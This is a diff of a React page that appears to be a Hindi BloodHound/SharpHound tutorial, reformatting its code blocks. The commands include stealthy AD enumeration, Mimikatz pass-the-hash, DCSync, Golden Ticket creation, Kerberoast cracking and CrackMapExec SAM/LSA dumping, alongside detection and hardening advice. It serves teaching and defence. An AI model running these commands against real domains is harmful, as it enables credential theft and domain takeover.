@@ -71,83 +71,15 @@ export default function Bloodhound() {
       </p>
       <CodeBlock
         title="BloodHound इंस्टॉल करें"
-        code={`# Kali Linux में प्री-इंस्टॉल्ड होता है:
-sudo apt update
-sudo apt install bloodhound
-
-# Neo4j इंस्टॉल करें (अगर नहीं है):
-sudo apt install neo4j
-
-# सोर्स से इंस्टॉल:
-git clone https://github.com/BloodHoundAD/BloodHound.git
-cd BloodHound
-npm install
-npm run build
-
-# Docker से इंस्टॉल:
-docker pull specterops/bloodhound
-docker run -d -p 7474:7474 -p 7687:7687 specterops/bloodhound
-
-# SharpHound डाउनलोड करें (Windows के लिए):
-# GitHub Releases से SharpHound.exe डाउनलोड करें
-
-# Python वर्जन (BloodHound.py):
-pip install bloodhound
-bloodhound-python -d target.local -u user -p password -c All`}
+        code={"# Kali Linux में प्री-इंस्टॉल्ड होता है:\nsudo apt update\nsudo apt install bloodhound\n\n# Neo4j इंस्टॉल करें (अगर नहीं है):\nsudo apt install neo4j\n\n# सोर्स से इंस्टॉल:\ngit clone https://github.com/BloodHoundAD/BloodHound.git\ncd BloodHound\nnpm install\nnpm run build\n\n# Docker से इंस्टॉल:\ndocker pull specterops/bloodhound\ndocker run -d -p 7474:7474 -p 7687:7687 specterops/bloodhound\n\n# SharpHound डाउनलोड करें (Windows के लिए):\n# GitHub Releases से SharpHound.exe डाउनलोड करें\n\n# Python वर्जन (BloodHound.py):\npip install bloodhound\nbloodhound-python -d target.local -u user -p password -c All"}
       />
       <CodeBlock
         title="BloodHound CE Docker Compose Install"
-        code={`# BloodHound CE — recommended installation method:
-# docker-compose.yml बनाओ:
-# version: '3'
-# services:
-#   bloodhound:
-#     image: specterops/bloodhound:latest
-#     ports:
-#       - "8080:8080"
-#     environment:
-#       - NEO4J_URI=bolt://neo4j:7687
-#       - NEO4J_USER=neo4j
-#       - NEO4J_PASSWORD=bloodhound
-#   neo4j:
-#     image: neo4j:5
-#     ports:
-#       - "7474:7474"
-#       - "7687:7687"
-#     environment:
-#       - NEO4J_AUTH=neo4j/bloodhound
-
-# Start करो:
-docker compose up -d
-
-# Browser में open करो:
-# http://localhost:8080
-# Default credentials: admin / admin (पहली बार change करो)
-
-# AzureHound install (Azure AD के लिए):
-# GitHub से download करो:
-# https://github.com/BloodHoundAD/AzureHound/releases`}
+        code={"# BloodHound CE — recommended installation method:\n# docker-compose.yml बनाओ:\n# version: '3'\n# services:\n#   bloodhound:\n#     image: specterops/bloodhound:latest\n#     ports:\n#       - \"8080:8080\"\n#     environment:\n#       - NEO4J_URI=bolt://neo4j:7687\n#       - NEO4J_USER=neo4j\n#       - NEO4J_PASSWORD=bloodhound\n#   neo4j:\n#     image: neo4j:5\n#     ports:\n#       - \"7474:7474\"\n#       - \"7687:7687\"\n#     environment:\n#       - NEO4J_AUTH=neo4j/bloodhound\n\n# Start करो:\ndocker compose up -d\n\n# Browser में open करो:\n# http://localhost:8080\n# Default credentials: admin / admin (पहली बार change करो)\n\n# AzureHound install (Azure AD के लिए):\n# GitHub से download करो:\n# https://github.com/BloodHoundAD/AzureHound/releases"}
       />
       <CodeBlock
         title="BloodHound on Windows"
-        code={`# Windows पर BloodHound CE:
-# Docker Desktop install करो पहले
-# फिर docker compose up -d चलाओ
-
-# SharpHound Windows पर:
-# PowerShell (Admin) में:
-# Import-Module .\\SharpHound.ps1
-# Invoke-BloodHound -CollectionMethod All
-
-# या exe version:
-# SharpHound.exe -c All
-
-# या C# version:
-# .\\SharpHound.exe -c All --outputdirectory C:\\BH
-
-# Linux से bloodhound-python:
-pip install bloodhound
-bloodhound-python -d corp.local -u svc_bh -p 'Password123' -c All -ns 10.0.0.1`}
+        code={"# Windows पर BloodHound CE:\n# Docker Desktop install करो पहले\n# फिर docker compose up -d चलाओ\n\n# SharpHound Windows पर:\n# PowerShell (Admin) में:\n# Import-Module .\\\\SharpHound.ps1\n# Invoke-BloodHound -CollectionMethod All\n\n# या exe version:\n# SharpHound.exe -c All\n\n# या C# version:\n# .\\\\SharpHound.exe -c All --outputdirectory C:\\\\BH\n\n# Linux से bloodhound-python:\npip install bloodhound\nbloodhound-python -d corp.local -u svc_bh -p 'Password123' -c All -ns 10.0.0.1"}
       />
 
       <h2>Data Collection (SharpHound)</h2>
@@ -156,31 +88,7 @@ bloodhound-python -d corp.local -u svc_bh -p 'Password123' -c All -ns 10.0.0.1`}
       </p>
       <CodeBlock
         title="SharpHound Data Collection"
-        code={`# सभी डेटा कलेक्ट करो:
-SharpHound.exe -c All
-
-# स्पेसिफिक कलेक्शन मेथड्स:
-SharpHound.exe -c Group,Session,ACL
-
-# लूप मोड — कंटीन्यूअस कलेक्शन (2 घंटे):
-SharpHound.exe -c All --loop --loopduration 02:00:00
-
-# हर 10 मिनट में:
-SharpHound.exe -c All --loop --loopduration 01:00:00 --loopsession 10
-
-# डोमेन स्पेसिफाई करें:
-SharpHound.exe -c All -d target.local
-
-# आउटपुट डायरेक्ट्री:
-SharpHound.exe -c All --outputdirectory C:\\temp
-
-# स्टील्थ मोड (कम डिटेक्शन):
-SharpHound.exe -c All --stealth
-
-# थर्ड पार्टी सर्वर से कलेक्ट:
-SharpHound.exe -c All --domaincontroller dc01.target.local
-
-# ZIP फाइल जनरेट होगी — उसे BloodHound में इम्पोर्ट करो`}
+        code={"# सभी डेटा कलेक्ट करो:\nSharpHound.exe -c All\n\n# स्पेसिफिक कलेक्शन मेथड्स:\nSharpHound.exe -c Group,Session,ACL\n\n# लूप मोड — कंटीन्यूअस कलेक्शन (2 घंटे):\nSharpHound.exe -c All --loop --loopduration 02:00:00\n\n# हर 10 मिनट में:\nSharpHound.exe -c All --loop --loopduration 01:00:00 --loopsession 10\n\n# डोमेन स्पेसिफाई करें:\nSharpHound.exe -c All -d target.local\n\n# आउटपुट डायरेक्ट्री:\nSharpHound.exe -c All --outputdirectory C:\\\\temp\n\n# स्टील्थ मोड (कम डिटेक्शन):\nSharpHound.exe -c All --stealth\n\n# थर्ड पार्टी सर्वर से कलेक्ट:\nSharpHound.exe -c All --domaincontroller dc01.target.local\n\n# ZIP फाइल जनरेट होगी — उसे BloodHound में इम्पोर्ट करो"}
       />
 
       <h2>Important Options Table</h2>
@@ -215,26 +123,7 @@ SharpHound.exe -c All --domaincontroller dc01.target.local
       </p>
       <CodeBlock
         title="Neo4j और BloodHound शुरू करें"
-        code={`# स्टेप 1: Neo4j शुरू करें:
-sudo neo4j console
-
-# अगर सर्विस के तौर पर चलाना है:
-sudo systemctl start neo4j
-
-# स्टेप 2: ब्राउज़र में Neo4j खोलें:
-# http://localhost:7474
-# डिफ़ॉल्ट लॉगिन: neo4j / neo4j
-# पासवर्ड बदलो (ज़रूरी है!)
-
-# स्टेप 3: BloodHound शुरू करें:
-bloodhound
-
-# या डायरेक्ट:
-# /usr/share/bloodhound/BloodHound-linux-x64/BloodHound
-
-# स्टेप 4: Neo4j क्रेडेंशियल्स से लॉगिन करो
-# SharpHound की ZIP फाइल ड्रैग & ड्रॉप करो
-# डेटा इम्पोर्ट हो जाएगा`}
+        code={"# स्टेप 1: Neo4j शुरू करें:\nsudo neo4j console\n\n# अगर सर्विस के तौर पर चलाना है:\nsudo systemctl start neo4j\n\n# स्टेप 2: ब्राउज़र में Neo4j खोलें:\n# http://localhost:7474\n# डिफ़ॉल्ट लॉगिन: neo4j / neo4j\n# पासवर्ड बदलो (ज़रूरी है!)\n\n# स्टेप 3: BloodHound शुरू करें:\nbloodhound\n\n# या डायरेक्ट:\n# /usr/share/bloodhound/BloodHound-linux-x64/BloodHound\n\n# स्टेप 4: Neo4j क्रेडेंशियल्स से लॉगिन करो\n# SharpHound की ZIP फाइल ड्रैग & ड्रॉप करो\n# डेटा इम्पोर्ट हो जाएगा"}
       />
 
       <h2>Pre-Built Queries</h2>
@@ -290,7 +179,7 @@ bloodhound
 
 # OWNERSHIP QUERIES:
 # "Find All Objects Owned by Users"
-# "Find Principals with Ownership"')}
+# "Find Principals with Ownership"`}
       />
 
       <h2>Attack Paths (Step-by-Step)</h2>
@@ -357,40 +246,7 @@ bloodhound
       </p>
       <CodeBlock
         title="Cypher Queries"
-        code={`# सभी Domain Admins ढूंढो:
-MATCH (g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"})
-MATCH (n)-[:MemberOf*1..]->(g)
-RETURN n.name, n.enabled
-
-# कौन सा यूज़र किस कंप्यूटर पर एडमिन है:
-MATCH p=shortestPath((u:User)-[:AdminTo*1..]->(c:Computer))
-RETURN u.name, c.name, length(p)
-
-# Kerberoastable यूज़र्स:
-MATCH (u:User {hasspn:true})
-WHERE NOT u.name STARTS WITH 'KRBTGT'
-RETURN u.name, u.serviceprincipalnames
-
-# AS-REP रोस्टेबल यूज़र्स:
-MATCH (u:User {dontreqpreauth:true})
-RETURN u.name
-
-# DCSync राइट्स वाले:
-MATCH p=shortestPath((n)-[:GetChanges|GetChangesAll*1..]->(d:Domain))
-RETURN n.name
-
-# सभी फॉरेन ग्रुप मेंबर्स:
-MATCH (n)-[:MemberOf]->(g:Domain {name: "OTHERDOMAIN.LOCAL"})
-RETURN n.name, g.name
-
-# सबसे छोटा पाथ Domain Admin तक:
-MATCH p=shortestPath((u:User)-[:AdminTo|HasSession|MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}))
-RETURN p
-
-# सभी कंप्यूटर्स जहाँ Domain Users एडमिन हैं:
-MATCH (g:Group {name:"DOMAIN USERS@TARGET.LOCAL"})
-MATCH (g)-[:AdminTo]->(c:Computer)
-RETURN c.name`}
+        code={"// सभी Domain Admins ढूंढो:\nMATCH (g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"})\nMATCH (n)-[:MemberOf*1..]->(g)\nRETURN n.name, n.enabled\n\n// कौन सा यूज़र किस कंप्यूटर पर एडमिन है:\nMATCH p=shortestPath((u:User)-[:AdminTo*1..]->(c:Computer))\nRETURN u.name, c.name, length(p)\n\n// Kerberoastable यूज़र्स:\nMATCH (u:User {hasspn:true})\nWHERE NOT u.name STARTS WITH \"KRBTGT\"\nRETURN u.name, u.serviceprincipalnames\n\n// AS-REP रोस्टेबल यूज़र्स:\nMATCH (u:User {dontreqpreauth:true})\nRETURN u.name\n\n// DCSync राइट्स वाले:\nMATCH p=shortestPath((n)-[:GetChanges|GetChangesAll*1..]->(d:Domain))\nRETURN n.name\n\n// सभी फॉरेन ग्रुप मेंबर्स:\nMATCH (n)-[:MemberOf]->(g:Domain {name: \"OTHERDOMAIN.LOCAL\"})\nRETURN n.name, g.name\n\n// सबसे छोटा पाथ Domain Admin तक:\nMATCH p=shortestPath((u:User)-[:AdminTo|HasSession|MemberOf*1..]->(g:Group {name:\"DOMAIN ADMINS@TARGET.LOCAL\"}))\nRETURN p\n\n// सभी कंप्यूटर्स जहाँ Domain Users एडमिन हैं:\nMATCH (g:Group {name:\"DOMAIN USERS@TARGET.LOCAL\"})\nMATCH (g)-[:AdminTo]->(c:Computer)\nRETURN c.name"}
       />
 
       <h2>BloodHound CE (Community Edition)</h2>
@@ -405,30 +261,7 @@ RETURN c.name`}
       </p>
       <CodeBlock
         title="BloodHound CE Install"
-        code={`# Docker Compose से इंस्टॉल:
-git clone https://github.com/SpecterOps/BloodHound.git
-cd BloodHound
-docker compose up -d
-
-# डिफ़ॉल्ट लॉगिन:
-# URL: http://localhost:8080
-# Admin: admin
-# पासवर्ड: डिफ़ॉल्ट पासवर्ड चेंज करो
-
-# नए SharpHound CE का उपयोग:
-# GitHub Releases से SharpHound CE डाउनलोड करो
-SharpHound.exe -c All
-
-# या BloodHound.py:
-pip install bloodhound
-bloodhound-python -d target.local -u user -p password -c All
-
-# नए फीचर्स:
-# - बेहतर परफॉर्मेंस
-# - Azure AD सपोर्ट
-# - नई एज टाइप्स
-# - बेहतर GUI
-# - API सपोर्ट`}
+        code={"# Docker Compose से इंस्टॉल:\ngit clone https://github.com/SpecterOps/BloodHound.git\ncd BloodHound\ndocker compose up -d\n\n# डिफ़ॉल्ट लॉगिन:\n# URL: http://localhost:8080\n# Admin: admin\n# पासवर्ड: डिफ़ॉल्ट पासवर्ड चेंज करो\n\n# नए SharpHound CE का उपयोग:\n# GitHub Releases से SharpHound CE डाउनलोड करो\nSharpHound.exe -c All\n\n# या BloodHound.py:\npip install bloodhound\nbloodhound-python -d target.local -u user -p password -c All\n\n# नए फीचर्स:\n# - बेहतर परफॉर्मेंस\n# - Azure AD सपोर्ट\n# - नई एज टाइप्स\n# - बेहतर GUI\n# - API सपोर्ट"}
       />
 
       <h2>Scripting & Automation</h2>
@@ -437,48 +270,11 @@ bloodhound-python -d target.local -u user -p password -c All
       </p>
       <CodeBlock
         title="Automation Scripts"
-        code={`# SharpHound ऑटोमेशन (Windows PowerShell):
-# डेली स्कैन शेड्यूल करो:
-$task = New-ScheduledTaskTrigger -Daily -At "2:00AM"
-Register-ScheduledTask -Trigger $task -User "DOMAIN\\svc_bloodhound" -TaskName "BH-Scan" -Action (New-ScheduledTaskAction -Execute "C:\\Tools\\SharpHound.exe" -Argument "-c All --outputdirectory C:\\BH\\Data")
-
-# Linux से Python ऑटोमेशन:
-# bloodhound-python इंस्टॉल:
-pip install bloodhound
-
-# ऑटोमेटिक कलेक्शन:
-bloodhound-python -d target.local -u svc_bloodhound -p 'Password123' -c All -ns 10.0.0.1
-
-# Neo4j Cypher कमांड लाइन से:
-echo "MATCH (n) RETURN count(n)" | cypher-shell -u neo4j -p password
-
-# Neo4j डेटाबेस क्लियर करो:
-echo "MATCH (n) DETACH DELETE n" | cypher-shell -u neo4j -p password
-
-# रिपोर्ट जनरेशन (bloodhound-cli):
-# CE वर्जन में API से रिपोर्ट जनरेट करो`}
+        code={"# SharpHound ऑटोमेशन (Windows PowerShell):\n# डेली स्कैन शेड्यूल करो:\n$task = New-ScheduledTaskTrigger -Daily -At \"2:00AM\"\nRegister-ScheduledTask -Trigger $task -User \"DOMAIN\\\\svc_bloodhound\" -TaskName \"BH-Scan\" -Action (New-ScheduledTaskAction -Execute \"C:\\\\Tools\\\\SharpHound.exe\" -Argument \"-c All --outputdirectory C:\\\\BH\\\\Data\")\n\n# Linux से Python ऑटोमेशन:\n# bloodhound-python इंस्टॉल:\npip install bloodhound\n\n# ऑटोमेटिक कलेक्शन:\nbloodhound-python -d target.local -u svc_bloodhound -p 'Password123' -c All -ns 10.0.0.1\n\n# Neo4j Cypher कमांड लाइन से:\necho \"MATCH (n) RETURN count(n)\" | cypher-shell -u neo4j -p password\n\n# Neo4j डेटाबेस क्लियर करो:\necho \"MATCH (n) DETACH DELETE n\" | cypher-shell -u neo4j -p password\n\n# रिपोर्ट जनरेशन (bloodhound-cli):\n# CE वर्जन में API से रिपोर्ट जनरेट करो"}
       />
       <CodeBlock
         title="Bulk Cypher Query Runner"
-        code={`# एक साथ कई क्वेरीज़ चलाओ और CSV में सेव करो:
-# queries.cypher फाइल बनाओ:
-# MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
-# MATCH (u:User {dontreqpreauth:true}) RETURN u.name
-# MATCH (n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name
-
-# Cypher queries रन करो:
-cat queries.cypher | cypher-shell -u neo4j -p password --format plain > results.txt
-
-# Python से automated reporting:
-python3 -c "
-from neo4j import GraphDatabase
-driver = GraphDatabase.driver('bolt://localhost:7687', auth=('neo4j','password'))
-with driver.session() as session:
-    result = session.run('MATCH (u:User {hasspn:true}) RETURN u.name')
-    for record in result:
-        print(record['u.name'])
-driver.close()
-"`}
+        code={"# एक साथ कई क्वेरीज़ चलाओ और CSV में सेव करो:\n# queries.cypher फाइल बनाओ:\n# MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames\n# MATCH (u:User {dontreqpreauth:true}) RETURN u.name\n# MATCH (n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name\n\n# Cypher queries रन करो:\ncat queries.cypher | cypher-shell -u neo4j -p password --format plain > results.txt\n\n# Python से automated reporting:\npython3 -c \"\nfrom neo4j import GraphDatabase\ndriver = GraphDatabase.driver('bolt://localhost:7687', auth=('neo4j','password'))\nwith driver.session() as session:\n    result = session.run('MATCH (u:User {hasspn:true}) RETURN u.name')\n    for record in result:\n        print(record['u.name'])\ndriver.close()\n\""}
       />
 
       <h2>Real-World Case Studies</h2>
@@ -493,23 +289,7 @@ driver.close()
       </p>
       <CodeBlock
         title="Common Attack Scenario"
-        code={`# स्टेप 1: डोमेन मेंबर मशीन से SharpHound चलाओ
-SharpHound.exe -c All --loop --loopduration 02:00:00
-
-# स्टेप 2: BloodHound में इम्पोर्ट करो
-# ZIP फाइल drag & drop करो
-
-# स्टेप 3: "Find Shortest Paths to Domain Admin" क्वेरी चलाओ
-# अटैक पाथ दिखेगा:
-# User A -> AdminTo -> Workstation1 -> HasSession -> DomainAdmin
-
-# स्टेप 4: Mimikatz से token impersonate करो
-# Workstation1 पर:
-sekurlsa::pth /user:DomainAdmin /domain:target.local /ntlm:hash
-
-# स्टेप 5: Domain Admin access मिल गया!
-# psexec से DC पर access:
-psexec \\\\dc01.target.local cmd.exe`}
+        code={"# स्टेप 1: डोमेन मेंबर मशीन से SharpHound चलाओ\nSharpHound.exe -c All --loop --loopduration 02:00:00\n\n# स्टेप 2: BloodHound में इम्पोर्ट करो\n# ZIP फाइल drag & drop करो\n\n# स्टेप 3: \"Find Shortest Paths to Domain Admin\" क्वेरी चलाओ\n# अटैक पाथ दिखेगा:\n# User A -> AdminTo -> Workstation1 -> HasSession -> DomainAdmin\n\n# स्टेप 4: Mimikatz से token impersonate करो\n# Workstation1 पर:\nsekurlsa::pth /user:DomainAdmin /domain:target.local /ntlm:hash\n\n# स्टेप 5: Domain Admin access मिल गया!\n# psexec से DC पर access:\npsexec \\\\\\\\dc01.target.local cmd.exe"}
       />
 
       <h2>Integration with Other Tools</h2>
@@ -518,37 +298,11 @@ psexec \\\\dc01.target.local cmd.exe`}
       </p>
       <CodeBlock
         title="BloodHound + Mimikatz Combo"
-        code={`# BloodHound से Kerberoastable users ढूंढो
-# फिर Mimikatz से TGS request करो:
-
-# Mimikatz में:
-kerberos::list /export
-# या Invoke-Kerberoast PowerShell से:
-Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt
-
-# Hashcat से crack करो:
-hashcat -m 13100 hashes.txt rockyou.txt
-
-# BloodHound से DCSync rights वाले users ढूंढो
-# फिर Mimikatz से DCSync:
-lsadump::dcsync /domain:target.local /user:krbtgt
-# Golden Ticket बनाओ:
-kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:hash /ptt`}
+        code={"# BloodHound से Kerberoastable users ढूंढो\n# फिर Mimikatz से TGS request करो:\n\n# Mimikatz में:\nkerberos::list /export\n# या Invoke-Kerberoast PowerShell से:\nInvoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt\n\n# Hashcat से crack करो:\nhashcat -m 13100 hashes.txt rockyou.txt\n\n# BloodHound से DCSync rights वाले users ढूंढो\n# फिर Mimikatz से DCSync:\nlsadump::dcsync /domain:target.local /user:krbtgt\n# Golden Ticket बनाओ:\nkerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:hash /ptt"}
       />
       <CodeBlock
         title="BloodHound + CrackMapExec Combo"
-        code={`# BloodHound से "Computers where Domain Users are Local Admin" ढूंढो
-# फिर CrackMapExec से lateral movement:
-
-# सभी कंप्यूटर्स पर local admin access check करो:
-crackmapexec smb 192.168.1.0/24 -u user -p password
-
-# जहाँ access मिले, वहाँ secrets dump करो:
-crackmapexec smb 192.168.1.50 -u user -p password --sam
-crackmapexec smb 192.168.1.50 -u user -p password --lsa
-
-# BloodHound से session data देखो
-# जो user admin है उसका hash crack करो या relay करो`}
+        code={"# BloodHound से \"Computers where Domain Users are Local Admin\" ढूंढो\n# फिर CrackMapExec से lateral movement:\n\n# सभी कंप्यूटर्स पर local admin access check करो:\ncrackmapexec smb 192.168.1.0/24 -u user -p password\n\n# जहाँ access मिले, वहाँ secrets dump करो:\ncrackmapexec smb 192.168.1.50 -u user -p password --sam\ncrackmapexec smb 192.168.1.50 -u user -p password --lsa\n\n# BloodHound से session data देखो\n# जो user admin है उसका hash crack करो या relay करो"}
       />
 
       <h2>Performance Tuning</h2>
@@ -557,28 +311,7 @@ crackmapexec smb 192.168.1.50 -u user -p password --lsa
       </p>
       <CodeBlock
         title="Performance Optimization"
-        code={`# Neo4j memory बढ़ाओ (neo4j.conf):
-dbms.memory.heap.initial_size=4G
-dbms.memory.heap.max_size=8G
-dbms.memory.pagecache.size=4G
-
-# BloodHound CE में:
-# Docker compose file में memory limits सेट करो
-# PostgreSQL performance tuning करो
-
-# SharpHound optimization:
-# सिर्फ ज़रूरी data collect करो (All की जगह specific methods):
-SharpHound.exe -c Group,Session,ACL,Trusts
-# Loop mode से continuous collection:
-SharpHound.exe -c All --loop --loopduration 02:00:00
-
-# Neo4j indexes create करो (performance बढ़ती है):
-# BloodHound GUI में settings -> Debug -> Create Indexes
-
-# बड़े datasets के लिए:
-# BloodHound CE use करो (better performance)
-# PostgreSQL optimize करो
-# समय-समय पर database purge करो और fresh import करो`}
+        code={"# Neo4j memory बढ़ाओ (neo4j.conf):\ndbms.memory.heap.initial_size=4G\ndbms.memory.heap.max_size=8G\ndbms.memory.pagecache.size=4G\n\n# BloodHound CE में:\n# Docker compose file में memory limits सेट करो\n# PostgreSQL performance tuning करो\n\n# SharpHound optimization:\n# सिर्फ ज़रूरी data collect करो (All की जगह specific methods):\nSharpHound.exe -c Group,Session,ACL,Trusts\n# Loop mode से continuous collection:\nSharpHound.exe -c All --loop --loopduration 02:00:00\n\n# Neo4j indexes create करो (performance बढ़ती है):\n# BloodHound GUI में settings -> Debug -> Create Indexes\n\n# बड़े datasets के लिए:\n# BloodHound CE use करो (better performance)\n# PostgreSQL optimize करो\n# समय-समय पर database purge करो और fresh import करो"}
       />
 
       <h2>Reporting and Output Analysis</h2>
@@ -587,26 +320,7 @@ SharpHound.exe -c All --loop --loopduration 02:00:00
       </p>
       <CodeBlock
         title="PlumHound Reporting"
-        code={`# PlumHound install करो:
-git clone https://github.com/PlumHound/PlumHound.git
-cd PlumHound
-pip install -r requirements.txt
-
-# BloodHound database से reports generate करो:
-python3 PlumHound.py --server bolt://localhost:7687 --username neo4j --password password --allreports
-
-# Specific reports:
-python3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy
-# easy = basic reports (Kerberoastable, AS-REP, Domain Admins)
-
-# HTML report generate करो:
-python3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy --reportHTML report.html
-
-# Custom queries से report:
-python3 PlumHound.py --server bolt://localhost:7687 -p password --tasks "MATCH (u:User {hasspn:true}) RETURN u.name"
-
-# CE version में API से reporting:
-curl -X GET http://localhost:8080/api/v2/domains -H "Authorization: Bearer token"`}
+        code={"# PlumHound install करो:\ngit clone https://github.com/PlumHound/PlumHound.git\ncd PlumHound\npip install -r requirements.txt\n\n# BloodHound database से reports generate करो:\npython3 PlumHound.py --server bolt://localhost:7687 --username neo4j --password password --allreports\n\n# Specific reports:\npython3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy\n# easy = basic reports (Kerberoastable, AS-REP, Domain Admins)\n\n# HTML report generate करो:\npython3 PlumHound.py --server bolt://localhost:7687 -p password --tasks easy --reportHTML report.html\n\n# Custom queries से report:\npython3 PlumHound.py --server bolt://localhost:7687 -p password --tasks \"MATCH (u:User {hasspn:true}) RETURN u.name\"\n\n# CE version में API से reporting:\ncurl -X GET http://localhost:8080/api/v2/domains -H \"Authorization: Bearer token\""}
       />
 
       <h2>Comparison Table</h2>
@@ -658,57 +372,11 @@ curl -X GET http://localhost:8080/api/v2/domains -H "Authorization: Bearer token
       </p>
       <CodeBlock
         title="Detection & Defense"
-        code={`# SHARPHOUND डिटेक्शन:
-
-# 1. LDAP क्वेरी मॉनिटरिंग:
-# Windows Event ID 1644 — LDAP क्वेरीज़ लॉग करो
-# SharpHound बहुत सारी LDAP क्वेरीज़ भेजता है
-
-# 2. नेटवर्क ट्रैफ़िक:
-# असामान्य LDAP ट्रैफ़िक देखो — SharpHound हज़ारों क्वेरीज़ भेजता है
-
-# 3. Process मॉनिटरिंग:
-# SharpHound.exe प्रोसेस देखो
-# .NET assemblies जो LDAP कॉल कर रही हैं
-
-# 4. Honeypot अकाउंट्स:
-# फेक अकाउंट्स बनाओ जो Domain Admin मेंबर दिखें
-# जब कोई इन्हें टार्गेट करे — अलर्ट आएगा
-
-# DEFENSE — अटैक पाथ्स तोड़ो:
-# 1. Admin tiering — Tier 0, 1, 2 सेपरेशन
-# 2. अनावश्यक AdminTo रिलेशनशिप्स हटाओ
-# 3. Service accounts को AdminTo न दो
-# 4. LAPS (Local Admin Password Solution) लगाओ
-# 5. Kerberoastable SPNs हटाओ
-# 6. AS-REP रोस्टिंग रोको (DONT_REQ_PREAUTH हटाओ)
-# 7. GPO enforcement — लोकल एडमिन ग्रुप कंट्रोल करो`}
+        code={"# SHARPHOUND डिटेक्शन:\n\n# 1. LDAP क्वेरी मॉनिटरिंग:\n# Windows Event ID 1644 — LDAP क्वेरीज़ लॉग करो\n# SharpHound बहुत सारी LDAP क्वेरीज़ भेजता है\n\n# 2. नेटवर्क ट्रैफ़िक:\n# असामान्य LDAP ट्रैफ़िक देखो — SharpHound हज़ारों क्वेरीज़ भेजता है\n\n# 3. Process मॉनिटरिंग:\n# SharpHound.exe प्रोसेस देखो\n# .NET assemblies जो LDAP कॉल कर रही हैं\n\n# 4. Honeypot अकाउंट्स:\n# फेक अकाउंट्स बनाओ जो Domain Admin मेंबर दिखें\n# जब कोई इन्हें टार्गेट करे — अलर्ट आएगा\n\n# DEFENSE — अटैक पाथ्स तोड़ो:\n# 1. Admin tiering — Tier 0, 1, 2 सेपरेशन\n# 2. अनावश्यक AdminTo रिलेशनशिप्स हटाओ\n# 3. Service accounts को AdminTo न दो\n# 4. LAPS (Local Admin Password Solution) लगाओ\n# 5. Kerberoastable SPNs हटाओ\n# 6. AS-REP रोस्टिंग रोको (DONT_REQ_PREAUTH हटाओ)\n# 7. GPO enforcement — लोकल एडमिन ग्रुप कंट्रोल करो"}
       />
       <CodeBlock
         title="Active Directory Hardening"
-        code={`# Kerberoasting mitigation:
-# Service accounts को long complex passwords दो (25+ chars)
-# Group Managed Service Accounts (gMSA) use करो
-# SPN accounts को Domain Admin से हटाओ
-
-# AS-REP Roasting mitigation:
-# DONT_REQ_PREAUTH flag हटाओ सभी accounts से:
-Set-ADAccountControl -Identity user -DoesNotRequirePreAuth $false
-
-# Unconstrained Delegation हटाओ:
-# Computers को constrained delegation दो
-# Unconstrained delegation set करने से बचो
-
-# Admin tiering implement करो:
-# Tier 0: Domain Controllers, Domain Admins
-# Tier 1: Servers, App Admins
-# Tier 2: Workstations, Users
-# Cross-tier admin access block करो
-
-# LAPS deploy करो:
-# Local Admin Password Solution install करो
-# हर machine का local admin password unique होगा
-# BloodHound LAPS-enabled machines track करता है`}
+        code={"# Kerberoasting mitigation:\n# Service accounts को long complex passwords दो (25+ chars)\n# Group Managed Service Accounts (gMSA) use करो\n# SPN accounts को Domain Admin से हटाओ\n\n# AS-REP Roasting mitigation:\n# DONT_REQ_PREAUTH flag हटाओ सभी accounts से:\nSet-ADAccountControl -Identity user -DoesNotRequirePreAuth $false\n\n# Unconstrained Delegation हटाओ:\n# Computers को constrained delegation दो\n# Unconstrained delegation set करने से बचो\n\n# Admin tiering implement करो:\n# Tier 0: Domain Controllers, Domain Admins\n# Tier 1: Servers, App Admins\n# Tier 2: Workstations, Users\n# Cross-tier admin access block करो\n\n# LAPS deploy करो:\n# Local Admin Password Solution install करो\n# हर machine का local admin password unique होगा\n# BloodHound LAPS-enabled machines track करता है"}
       />
 
       <h2>Lab Environment Setup</h2>
@@ -717,55 +385,11 @@ Set-ADAccountControl -Identity user -DoesNotRequirePreAuth $false
       </p>
       <CodeBlock
         title="AD Lab Setup"
-        code={`# ज़रूरी मशीन्स:
-# 1. Windows Server 2019/2022 — Domain Controller
-# 2. Windows 10/11 — Domain Member (2-3 मशीन्स)
-# 3. Kali Linux — BloodHound चलाने के लिए
-
-# स्टेप 1: Windows Server पर AD DS इंस्टॉल:
-Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
-Install-ADDSForest -DomainName "lab.local" -DomainNetBIOSName "LAB"
-
-# स्टेप 2: यूज़र्स और ग्रुप्स बनाओ:
-New-ADUser -Name "TestUser1" -SamAccountName "testuser1"
-New-ADGroup -Name "Tier1Admins" -GroupScope Global
-Add-ADGroupMember -Identity "Domain Admins" -Members "Administrator"
-
-# स्टेप 3: कंप्यूटर्स जॉइन करो:
-# Windows 10 मशीन्स को डोमेन में जॉइन करो
-
-# स्टेप 4: SharpHound चलाओ:
-# डोमेन मेंबर मशीन से:
-SharpHound.exe -c All
-
-# स्टेप 5: Kali पर BloodHound में इम्पोर्ट करो
-# Neo4j + BloodHound GUI शुरू करो
-# ZIP फाइल ड्रैग & ड्रॉप करो`}
